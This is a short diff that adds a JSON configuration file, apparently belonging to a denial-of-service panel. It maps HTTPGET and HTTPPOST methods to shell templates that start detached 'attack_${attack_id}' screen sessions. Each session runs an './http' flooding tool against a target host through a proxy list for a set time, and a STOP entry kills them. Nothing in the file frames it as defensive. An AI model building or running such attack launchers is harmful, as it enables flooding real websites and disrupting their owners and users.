@@ -1,0 +1,5 @@
+{
+    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
+    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
+    "STOP": "screen -dm pkill -f ${host}"
+}
